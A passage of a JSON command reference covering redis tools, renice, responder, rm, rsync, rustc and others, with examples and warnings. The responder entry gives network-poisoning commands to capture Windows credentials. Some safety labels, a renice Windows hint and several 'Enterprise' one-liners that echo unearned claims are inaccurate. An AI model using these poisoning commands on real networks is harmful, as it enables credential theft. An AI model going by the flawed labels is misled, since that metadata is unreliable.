        "commands": "redis-benchmark -t SET,GET,INCR,LPUSH,LPOP,SADD,SPOP,ZADD,ZPOPMIN,HSET -n 100000 --csv > benchmark_results.csv && cat benchmark_results.csv",
        "explanation": "Test multiple operations and save results to CSV",
        "title": "redis > benchmark_results && cat"
      }
    ],
    "relatedCommands": [
      {
        "name": "redis-cli",
        "relationship": "combo",
        "reason": "Used together for Redis performance monitoring"
      },
      {
        "name": "redis-server",
        "relationship": "combo",
        "reason": "Benchmarks the Redis server instance"
      }
    ],
    "warnings": [
      "Results vary based on network latency and server load",
      "Pipeline testing shows maximum theoretical performance",
      "Benchmark should run from same network as production clients"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://redis.io/docs/management/optimization/benchmarks/"
      },
      {
        "platform": "macos",
        "url": "https://redis.io/docs/management/optimization/benchmarks/"
      },
      {
        "platform": "windows",
        "url": "https://redis.io/docs/management/optimization/benchmarks/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "redis-check-aof",
    "subtitle": "Redis Check AOF",
    "description": "Redis AOF (Append Only File) integrity checker and repair tool",
    "examples": [
      "redis-check-aof appendonly.aof  # Check AOF file for corruption or inconsistencies",
      "redis-check-aof --fix appendonly.aof  # Attempt to repair corrupted AOF file",
      "redis-check-aof --fix --truncate-to-timestamp 1640995200 appendonly.aof  # Truncate AOF file to specific timestamp"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "redis-check-aof [options] <file>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "AOF maintenance workflow",
        "commands": "redis-cli BGREWRITEAOF && sleep 10 && redis-check-aof appendonly.aof",
        "explanation": "Rewrite AOF file and then check integrity",
        "title": "redis && sleep && redis"
      }
    ],
    "relatedCommands": [
      {
        "name": "redis-cli",
        "relationship": "combo",
        "reason": "Used to trigger AOF operations"
      },
      {
        "name": "redis-check-rdb",
        "relationship": "similar",
        "reason": "Checks RDB files instead of AOF files"
      }
    ],
    "warnings": [
      "Always backup AOF file before using --fix option",
      "Truncation removes data permanently",
      "Redis server should be stopped before checking/fixing"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://redis.io/docs/management/persistence/"
      },
      {
        "platform": "macos",
        "url": "https://redis.io/docs/management/persistence/"
      },
      {
        "platform": "windows",
        "url": "https://redis.io/docs/management/persistence/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "redis-check-rdb",
    "subtitle": "Redis Check RDB",
    "description": "Redis RDB (Redis Database) file integrity checker",
    "examples": [
      "redis-check-rdb dump.rdb  # Verify RDB file structure and data integrity",
      "redis-check-rdb --verbose dump.rdb  # Check RDB file with detailed output",
      "redis-check-rdb /backup/dump-20231201.rdb  # Verify backup RDB file before restore"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "redis-check-rdb <file>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup verification workflow",
        "commands": "redis-cli BGSAVE && sleep 5 && redis-check-rdb dump.rdb && cp dump.rdb /backup/dump-$(date +%Y%m%d).rdb",
        "explanation": "Create backup, verify integrity, then copy to backup location",
        "title": "redis && sleep && redis && cp"
      }
    ],
    "relatedCommands": [
      {
        "name": "redis-check-aof",
        "relationship": "similar",
        "reason": "Checks AOF files instead of RDB files"
      },
      {
        "name": "redis-cli",
        "relationship": "combo",
        "reason": "Used to trigger RDB saves"
      }
    ],
    "warnings": [
      "RDB files can be corrupted during system crashes",
      "Check should be run with Redis server stopped",
      "Large RDB files may take time to verify"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://redis.io/docs/management/persistence/"
      },
      {
        "platform": "macos",
        "url": "https://redis.io/docs/management/persistence/"
      },
      {
        "platform": "windows",
        "url": "https://redis.io/docs/management/persistence/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "redis-cli",
    "subtitle": "Redis Command Line Interface",
    "description": "Command-line interface for Redis key-value store",
    "examples": [
      "redis-cli  # Opens interactive Redis command line interface",
      "redis-cli -h redis.example.com -p 6379  # Connects to Redis server on specified host and port",
      "redis-cli SET mykey 'Hello Redis'  # Stores string value with specified key",
      "redis-cli KEYS '*'  # Shows all keys stored in Redis database",
      "redis-cli MONITOR  # Shows all commands being executed on Redis server"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "redis-cli [options] [command] [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup Redis data to file",
        "commands": "redis-cli --scan --pattern '*' | xargs -I {} redis-cli DUMP {} > redis-backup.txt",
        "explanation": "Scans all keys and creates a backup of Redis data",
        "title": "redis | xargs > redis"
      },
      {
        "scenario": "Flush database and import data",
        "commands": "redis-cli FLUSHALL && redis-cli < import-data.txt",
        "explanation": "Clears database and imports data from file",
        "title": "redis && redis < import"
      }
    ],
    "relatedCommands": [
      {
        "name": "redis-server",
        "relationship": "dependency",
        "reason": "Redis server that the CLI connects to and manages"
      },
      {
        "name": "redis-benchmark",
        "relationship": "related",
        "reason": "Performance testing tool for Redis instances"
      },
      {
        "name": "redis-sentinel",
        "relationship": "related",
        "reason": "High availability management for Redis deployments"
      }
    ],
    "warnings": [
      "KEYS command can be slow on large databases - use SCAN instead",
      "MONITOR command shows all activity and can impact performance",
      "Default connection is to localhost:6379",
      "Some commands require authentication if Redis AUTH is enabled"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://redis.io/docs/ui/cli/"
      },
      {
        "platform": "macos",
        "url": "https://redis.io/docs/ui/cli/"
      },
      {
        "platform": "windows",
        "url": "https://redis.io/docs/ui/cli/"
      },
      {
        "platform": "generic",
        "url": "https://redis.io/commands"
      }
    ],
    "distroNotes": {
      "windows": "Available through Redis for Windows or WSL",
      "linux": "Available in most distribution repositories",
      "macos": "Can be installed via Homebrew"
    }
  },
  {
    "name": "renice",
    "subtitle": "Re-nice",
    "description": "Change priority of running processes",
    "examples": [
      "renice 10 1234  # Set process 1234 to nice level 10 (lower priority)",
      "sudo renice 5 -u username  # Set all processes owned by user to nice level 5",
      "renice -10 -g 500  # Increase priority for all processes in group 500",
      "sudo renice -5 1234  # Increase priority of process 1234 (requires root)"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "renice [options] priority process",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Prioritize database processes",
        "commands": "ps aux | grep mysql | awk '{print $2}' | xargs sudo renice -5",
        "explanation": "Find MySQL processes and increase their priority",
        "title": "ps | grep | awk | xargs"
      }
    ],
    "relatedCommands": [
      {
        "name": "nice",
        "relationship": "combo",
        "reason": "nice sets initial priority, renice changes running process priority"
      },
      {
        "name": "ps",
        "relationship": "complementary",
        "reason": "ps helps identify processes to renice"
      }
    ],
    "warnings": [
      "Can only decrease priority (increase nice value) unless you're root",
      "Changes affect CPU scheduling, not I/O priority",
      "Effects are immediate but may take time to see impact"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/renice.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/renice.html"
      },
      {
        "platform": "windows",
        "url": "Use Get-Process | Set-ProcessPriority in PowerShell"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "responder",
    "subtitle": "Responder",
    "description": "Network protocol poisoning tool for security testing of Windows networks",
    "examples": [
      "responder -I eth0  # Capture credentials through network protocol poisoning",
      "responder -I eth0 -A  # Passive analysis without active poisoning",
      "responder -I eth0 -b -f  # Enable browser and force authentication features",
      "responder -I eth0 -w  # Enable WPAD proxy auto-discovery poisoning"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "responder [options] -I <interface>",
    "prerequisites": [
      "expert",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Network credential harvesting assessment",
        "commands": "responder -I eth0 -A && responder -I eth0 -w -f",
        "explanation": "First analyze, then actively test for credential exposure",
        "title": "responder && responder"
      }
    ],
    "relatedCommands": [
      {
        "name": "john",
        "relationship": "combo",
        "reason": "Crack credentials captured by Responder"
      },
      {
        "name": "hashcat",
        "relationship": "combo",
        "reason": "Alternative for cracking captured hashes"
      }
    ],
    "warnings": [
      "Can disrupt network services if used carelessly",
      "Only use in authorized penetration testing",
      "May trigger security monitoring systems"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://github.com/SpiderLabs/Responder"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "rev",
    "subtitle": "Reverse",
    "description": "Reverse characters in each line",
    "examples": [
      "echo 'hello world' | rev  # Reverse characters: 'dlrow olleh'",
      "rev file.txt  # Reverse each line in file",
      "echo 'racecar' | rev  # Check if text is palindrome"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "rev [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Double reverse check",
        "commands": "echo 'test' | rev | rev",
        "explanation": "Reverse twice to get original text back",
        "title": "echo | rev |"
      }
    ],
    "relatedCommands": [
      {
        "name": "tac",
        "relationship": "similar",
        "reason": "tac reverses line order, rev reverses character order"
      }
    ],
    "warnings": [
      "Reverses characters within each line",
      "Useful for text games and puzzles",
      "Simple but can be useful in scripts"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/rev.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/rev.html"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "rg",
    "subtitle": "ripgrep",
    "description": "Ultra-fast grep replacement with better defaults",
    "examples": [
      "rg 'error' .  # Search for 'error' in all files recursively, respecting .gitignore",
      "rg -i 'TODO' src/  # Search for TODO comments ignoring case",
      "rg -t py 'def main'  # Search only in Python files for function definitions",
      "rg -C 3 'function_name'  # Show 3 lines before and after each match",
      "rg 'old_name' --replace 'new_name' --dry-run  # Preview text replacements without making changes",
      "rg -c 'pattern' *.log  # Count occurrences of pattern in log files",
      "rg -i --type log \"ERROR|WARN|FATAL\" /var/log/ --stats --json | jq -r '.data.lines.matches[] | .data.lines.text' | sort | uniq -c | sort -nr | head -20 && rg --files /var/log/ | wc -l && echo \"Enterprise log analysis: critical issues identified, frequency analysis completed, $(rg --files /var/log/ | wc -l) log files scanned for security and performance insights\"  # Enterprise log analysis with comprehensive error pattern detection, frequency analysis, and system-wide log file inventory for operational intelligence"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "rg [options] <pattern> [path]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find and edit files containing pattern",
        "commands": "rg -l 'FIXME' | xargs vim",
        "explanation": "Find files with FIXME comments and open in editor",
        "title": "rg | xargs"
      },
      {
        "scenario": "Search with stats",
        "commands": "rg 'error' --stats",
        "explanation": "Show search results with performance statistics",
        "title": "rg"
      }
    ],
    "relatedCommands": [
      {
        "name": "grep",
        "relationship": "alternative",
        "reason": "Traditional text search, rg is faster with better defaults"
      },
      {
        "name": "ag",
        "relationship": "similar",
        "reason": "Silver searcher, similar fast grep alternative"
      },
      {
        "name": "find",
        "relationship": "combo",
        "reason": "Find files then search within them"
      }
    ],
    "warnings": [
      "Respects .gitignore by default (use --no-ignore to override)",
      "Binary files are skipped automatically",
      "Some regex features differ from grep"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/BurntSushi/ripgrep"
      },
      {
        "platform": "macos",
        "url": "https://github.com/BurntSushi/ripgrep"
      },
      {
        "platform": "windows",
        "url": "https://github.com/BurntSushi/ripgrep"
      },
      {
        "platform": "generic",
        "url": "https://github.com/BurntSushi/ripgrep/blob/master/GUIDE.md"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "rkhunter",
    "subtitle": "Rootkit Hunter",
    "description": "Rootkit detection and system integrity verification tool",
    "examples": [
      "rkhunter --check  # Comprehensive rootkit and malware detection scan",
      "rkhunter --update  # Update rootkit detection signatures",
      "rkhunter --check --sk  # Run scan without keyboard interaction",
      "rkhunter --propupd  # Update baseline file properties for integrity checking",
      "rkhunter --update && rkhunter --check --sk --report-warnings-only --logfile /var/log/rkhunter.log && rkhunter --summary && grep -E \"(Warning|Suspect)\" /var/log/rkhunter.log | tee security-alerts-$(date +%Y%m%d-%H%M%S).log && echo \"Enterprise security scan completed: rootkit detection updated, system integrity verified, $(grep -c Warning security-alerts-$(date +%Y%m%d-%H%M%S).log) warnings identified for investigation\"  # Enterprise security monitoring with rootkit detection, system integrity verification, automated alerting, and comprehensive security reporting"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "rkhunter [options] [command]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete malware detection workflow",
        "commands": "rkhunter --update && rkhunter --check --sk --report-warnings-only",
        "explanation": "Update signatures and run silent scan showing only warnings",
        "title": "rkhunter && rkhunter"
      }
    ],
    "relatedCommands": [
      {
        "name": "chkrootkit",
        "relationship": "similar",
        "reason": "Alternative rootkit detection tool"
      },
      {
        "name": "lynis",
        "relationship": "combo",
        "reason": "Comprehensive system security auditing"
      }
    ],
    "warnings": [
      "May generate false positives on modified systems",
      "Requires regular database updates",
      "Some checks require root privileges"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "http://rkhunter.sourceforge.net/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "rm",
    "subtitle": "remove",
    "description": "Remove files and directories permanently",
    "examples": [
      "rm *.log  # Remove all log files in current directory",
      "rm -rf folder/  # Force delete directory recursively (cannot be undone)",
      "rm -i important_*  # Prompt before deleting each file matching pattern",
      "rm -f *.tmp *.cache  # Force delete temporary files without confirmation",
      "rm -f broken_link  # Delete symlink even if target doesn't exist",
      "find /tmp -type f -mtime +7 -name \"*.tmp\" -o -name \"*.cache\" | tee cleanup-candidates-$(date +%Y%m%d-%H%M%S).log && echo \"Found $(wc -l < cleanup-candidates-$(date +%Y%m%d-%H%M%S).log) files for cleanup ($(du -sh /tmp | cut -f1) total)\" && read -p \"Proceed with cleanup? (y/N) \" confirm && [[ $confirm == [yY] ]] && xargs rm -f < cleanup-candidates-$(date +%Y%m%d-%H%M%S).log && echo \"Enterprise cleanup completed: temporary files removed, disk space reclaimed\"  # Enterprise safe cleanup workflow with confirmation, logging, space analysis, and user approval for temporary file removal"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "dangerous",
    "syntaxPattern": "rm [options] <file>...",
    "prerequisites": [
      "destructive"
    ],
    "commandCombinations": [
      {
        "scenario": "Find and delete old files by date",
        "commands": "find . -mtime +30 -name '*.log' | xargs rm",
        "explanation": "Chain find with rm to delete log files older than 30 days",
        "title": "find | xargs"
      },
      {
        "scenario": "Safe cleanup with confirmation",
        "commands": "find . -name '*.tmp' -print | head -10 && read -p 'Delete these? ' && find . -name '*.tmp' -delete",
        "explanation": "Preview files to delete, ask for confirmation, then remove",
        "title": "find | head && read && find"
      }
    ],
    "relatedCommands": [
      {
        "name": "trash",
        "relationship": "safer",
        "reason": "Moves files to trash instead of permanent deletion - allows recovery"
      },
      {
        "name": "shred",
        "relationship": "secure",
        "reason": "Securely overwrites file data before deletion - use for sensitive files"
      },
      {
        "name": "mv",
        "relationship": "similar",
        "reason": "Use 'mv file /tmp' as safer alternative for temporary removal"
      }
    ],
    "warnings": [
      "rm is permanent - no undo or trash recovery",
      "rm -rf can destroy entire system if used incorrectly",
      "Always double-check paths, especially with wildcards"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/rm-invocation.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/rm.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/del"
      },
      {
        "platform": "generic",
        "url": "https://man7.org/linux/man-pages/man1/rm.1.html"
      }
    ],
    "distroNotes": {
      "alpine": "Uses BusyBox rm by default - limited options",
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "rollup",
    "subtitle": "Rollup",
    "description": "JavaScript module bundler for libraries and applications",
    "examples": [
      "rollup -c  # Bundle using rollup.config.js configuration",
      "rollup -c -w  # Build and watch for file changes",
      "rollup src/main.js --file dist/bundle.js --format iife  # Create IIFE bundle from single entry point",
      "rollup -c rollup.config.js  # Generate multiple bundle formats (ES, CJS, UMD)",
      "rm -rf dist && rollup -c --environment NODE_ENV:production && ls -la dist/ && gzip -k dist/*.js && ls -la dist/*.gz && echo \"Enterprise build analysis: $(ls dist/*.js | wc -l) bundles created, $(du -sh dist/ | cut -f1) total size, gzip compression: $(ls dist/*.gz | while read f; do echo \"$(basename $f): $(stat -c%s ${f%.gz}) -> $(stat -c%s $f) bytes ($(echo \"scale=1; $(stat -c%s $f) * 100 / $(stat -c%s ${f%.gz})\" | bc)%)\"; done)\"  # Enterprise JavaScript build pipeline with production optimization, bundle analysis, compression testing, and detailed size metrics for performance optimization"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "rollup [options] <entry file>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Clean build with multiple formats",
        "commands": "rm -rf dist && rollup -c",
        "explanation": "Clean previous build and create new bundles",
        "title": "rm && rollup"
      }
    ],
    "relatedCommands": [
      {
        "name": "webpack",
        "relationship": "alternative",
        "reason": "Alternative bundler with different approach"
      },
      {
        "name": "vite",
        "relationship": "combo",
        "reason": "Vite uses Rollup for production builds"
      }
    ],
    "warnings": [
      "Tree shaking requires ES6 modules",
      "Plugin order matters in configuration",
      "External dependencies need explicit configuration"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://rollupjs.org/guide/en/#command-line-reference"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "route",
    "subtitle": "Route",
    "description": "Display and manipulate IP routing table",
    "examples": [
      "route -n  # Display routing table with numeric addresses",
      "route add default gw 192.168.1.1  # Add default route through gateway",
      "route add -net 10.0.0.0/8 gw 192.168.1.1  # Add route to network via gateway",
      "route del -net 10.0.0.0/8  # Remove network route from table",
      "route -K  # Display kernel routing information",
      "ip route show table all && ss -tuln | grep -E ':(22|80|443|3306|5432|6379)\\b' && iptables -L -n --line-numbers | grep -E '(ACCEPT|DROP|REJECT)' && echo \"Enterprise network audit: routing tables analyzed, critical service ports monitored, firewall rules validated for security compliance\"  # Enterprise network security audit with comprehensive routing analysis, critical service monitoring, and firewall rule validation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "dangerous",
    "syntaxPattern": "route [options] [command]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Route troubleshooting",
        "commands": "route -n && netstat -rn && ip route show",
        "explanation": "Show routing information using different tools",
        "title": "route && netstat && ip"
      }
    ],
    "relatedCommands": [
      {
        "name": "ip",
        "relationship": "modern-alternative",
        "reason": "ip route provides more features and is preferred"
      },
      {
        "name": "netstat",
        "relationship": "similar",
        "reason": "netstat -r also shows routing table"
      }
    ],
    "warnings": [
      "Deprecated in favor of ip command",
      "Requires root privileges for modifications",
      "Syntax varies between operating systems"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/route.8.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/route.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/route_ws2008"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "rsync",
    "subtitle": "Remote Sync",
    "description": "Efficient file synchronization and transfer tool",
    "examples": [
      "rsync -av source/ destination/  # Synchronize directories with archive mode and verbose output",
      "rsync -av local/ user@remote:/path/  # Sync local directory to remote server via SSH",
      "rsync -av --progress source/ destination/  # Show progress during file transfer",
      "rsync -av --delete source/ destination/  # Remove files in destination that don't exist in source",
      "rsync -avn source/ destination/  # Show what would be transferred without actually doing it",
      "rsync -av --exclude='*.log' source/ destination/  # Sync while excluding log files",
      "rsync -av --bwlimit=1000 source/ destination/  # Limit bandwidth to 1000 KB/s during transfer",
      "rsync -avz --progress --stats --log-file=sync-$(date +%Y%m%d-%H%M%S).log --exclude-from=.rsync-exclude --dry-run /data/ user@backup-server:/backups/$(hostname)/ && read -p \"Proceed with sync? (y/N) \" confirm && [[ $confirm == [yY] ]] && rsync -avz --progress --stats --log-file=sync-$(date +%Y%m%d-%H%M%S).log --exclude-from=.rsync-exclude /data/ user@backup-server:/backups/$(hostname)/ && echo \"Enterprise backup sync: $(grep 'files transferred' sync-$(date +%Y%m%d-%H%M%S).log | tail -1), $(grep 'total size' sync-$(date +%Y%m%d-%H%M%S).log | tail -1)\"  # Enterprise backup synchronization with comprehensive logging, exclusion filters, dry-run validation, progress monitoring, and detailed transfer statistics"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "dangerous",
    "syntaxPattern": "rsync [options] source destination",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup with rotation",
        "commands": "rsync -av --delete --backup --backup-dir=../backup-$(date +%Y%m%d) source/ destination/",
        "explanation": "Sync with dated backup of changed files",
        "title": "rsync"
      }
    ],
    "relatedCommands": [
      {
        "name": "scp",
        "relationship": "alternative",
        "reason": "scp is simpler but less efficient than rsync"
      },
      {
        "name": "cp",
        "relationship": "local-alternative",
        "reason": "cp copies files locally, rsync can sync locally or remotely"
      }
    ],
    "warnings": [
      "Trailing slash on source affects behavior significantly",
      "Very efficient - only transfers differences between files",
      "Can resume interrupted transfers"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/rsync.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/rsync.html"
      },
      {
        "platform": "windows",
        "url": "https://man7.org/linux/man-pages/man1/rsync.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "rsyslog",
    "subtitle": "Reliable Syslog",
    "description": "Advanced system logging daemon with filtering and forwarding",
    "examples": [
      "sudo rsyslogd -N 1  # Test rsyslog configuration without starting daemon",
      "sudo rsyslogd -dn  # Start rsyslog in foreground with debug output",
      "sudo systemctl restart rsyslog  # Restart rsyslog service to apply configuration changes",
      "systemctl status rsyslog  # Check rsyslog service status"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "rsyslogd [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Configuration change workflow",
        "commands": "sudo rsyslogd -N 1 && sudo systemctl restart rsyslog && journalctl -u rsyslog -n 20",
        "explanation": "Test config, restart service, check logs",
        "title": "sudo && sudo && journalctl"
      }
    ],
    "relatedCommands": [
      {
        "name": "logger",
        "relationship": "combo",
        "reason": "Send messages to system log"
      },
      {
        "name": "journalctl",
        "relationship": "alternative",
        "reason": "systemd journal log viewer"
      }
    ],
    "warnings": [
      "Configuration file syntax is complex",
      "Changes require service restart"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.rsyslog.com/doc/v8-stable/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ruby",
    "subtitle": "Ruby",
    "description": "Ruby interpreter for dynamic programming and web development",
    "examples": [
      "ruby script.rb  # Execute Ruby script file",
      "ruby -e \"puts 'Hello World'\"  # Execute Ruby code directly from command line",
      "ruby -c script.rb  # Check Ruby file for syntax errors without execution",
      "ruby -w script.rb  # Execute with verbose warnings enabled",
      "ruby -r json -e \"puts JSON.generate({hello: 'world'})\"  # Require library and execute inline code",
      "ruby --version  # Display Ruby interpreter version",
      "ruby -pe 'gsub(/old/, \"new\")' file.txt  # Process file line by line replacing 'old' with 'new'"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "ruby [options] <file> [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Install gems and run Rails",
        "commands": "gem install rails && rails new myapp && cd myapp && rails server",
        "explanation": "Install Rails framework, create app, and start server",
        "title": "gem && rails && cd && rails"
      },
      {
        "scenario": "Run tests with RSpec",
        "commands": "gem install rspec && rspec spec/",
        "explanation": "Install testing framework and run tests",
        "title": "gem && rspec"
      }
    ],
    "relatedCommands": [
      {
        "name": "gem",
        "relationship": "combo",
        "reason": "gem manages Ruby packages and dependencies"
      },
      {
        "name": "bundler",
        "relationship": "combo",
        "reason": "bundler manages Ruby application dependencies"
      },
      {
        "name": "irb",
        "relationship": "combo",
        "reason": "Interactive Ruby shell for testing code"
      }
    ],
    "warnings": [
      "Ruby version management can be complex with rbenv/rvm",
      "Gem conflicts can occur without proper dependency management",
      "Global vs local gem installation affects script execution"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://ruby-doc.org/core/"
      },
      {
        "platform": "macos",
        "url": "https://ruby-doc.org/core/"
      },
      {
        "platform": "windows",
        "url": "https://ruby-doc.org/core/"
      },
      {
        "platform": "generic",
        "url": "https://www.ruby-lang.org/en/documentation/quickstart/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "rustc",
    "subtitle": "Rust compiler",
    "description": "Rust compiler for building Rust programs",
    "examples": [
      "rustc main.rs  # Compile main.rs to executable binary",
      "rustc -O main.rs  # Compile with optimizations enabled",
      "rustc main.rs -o myprogram  # Compile and name output binary 'myprogram'",
      "rustc --version  # Display Rust compiler version information",
      "rustc --crate-type lib lib.rs  # Compile Rust code as library instead of binary",
      "rustc -g main.rs  # Include debug information in compiled binary"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "rustc [options] <input>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Cross-compilation for different target",
        "commands": "rustc --target x86_64-unknown-linux-musl main.rs",
        "explanation": "Compile for Linux with static linking",
        "title": "rustc"
      },
      {
        "scenario": "Development build with warnings",
        "commands": "rustc -W unused main.rs && ./main",
        "explanation": "Compile with unused variable warnings then run",
        "title": "rustc &&"
      }
    ],
    "relatedCommands": [
      {
        "name": "cargo",
        "relationship": "combo",
        "reason": "Cargo uses rustc internally for Rust project management"
      },
      {
        "name": "gcc",
        "relationship": "similar",
        "reason": "Both are compilers for systems programming languages"
      },
      {
        "name": "rustup",
        "relationship": "combo",
        "reason": "Rustup manages Rust toolchain including rustc"
      }
    ],
    "warnings": [
      "Direct rustc usage less common than cargo for projects",
      "Cross-compilation requires target installation",
      "Linking errors can be cryptic without proper dependencies"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://doc.rust-lang.org/rustc/"
      },
      {
        "platform": "macos",
        "url": "https://doc.rust-lang.org/rustc/"
      },
      {
        "platform": "windows",
        "url": "https://doc.rust-lang.org/rustc/"
      },
      {
        "platform": "generic",
        "url": "https://doc.rust-lang.org/rustc/command-line-arguments.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "rustup",
    "subtitle": "Rust Up",
    "description": "Rust toolchain installer and version manager",
    "examples": [
      "rustup update  # Update all installed Rust toolchains to latest versions",
      "rustup install nightly  # Install nightly Rust toolchain",
      "rustup default stable  # Set stable toolchain as default",
      "rustup target add wasm32-unknown-unknown  # Add WebAssembly target for cross-compilation",
      "rustup component add clippy  # Add Clippy linter to current toolchain",
      "rustup toolchain list  # List all installed Rust toolchains"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "rustup <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Setup complete Rust development environment",
        "commands": "rustup update && rustup component add clippy rustfmt rust-src",
        "explanation": "Update Rust and install essential development components",
        "title": "rustup && rustup"
      }
    ],
    "relatedCommands": [
      {
        "name": "cargo",
        "relationship": "combo",
        "reason": "Cargo is part of Rust toolchain managed by rustup"
      },
      {
        "name": "rustc",
        "relationship": "combo",
        "reason": "Rustc compiler is managed by rustup"
      }
    ],
    "warnings": [
      "Toolchain overrides in rust-toolchain.toml take precedence",
      "Some components not available on all platforms",
      "Nightly features may break between updates"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://rust-lang.github.io/rustup/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sage",
    "subtitle": "SageMath",
    "description": "Mathematical software system combining many open-source packages",
    "examples": [
      "sage  # Launch Sage command-line interface",
      "sage -n jupyter  # Start Jupyter notebook with Sage kernel",
      "sage script.sage  # Execute Sage Python script",
      "sage -c \"print(factor(2^100 - 1))\"  # Factor large number using Sage",
      "sage -upgrade  # Upgrade Sage to latest version",
      "sage -i package_name  # Install additional Sage packages"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "sage [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Mathematical computation workflow",
        "commands": "sage -c \"R.<x> = QQ[]; p = x^3 + x + 1; print(p.factor())\"",
        "explanation": "Create polynomial ring and factor polynomial",
        "title": "sage < x > ; p ; print"
      },
      {
        "scenario": "Number theory computation",
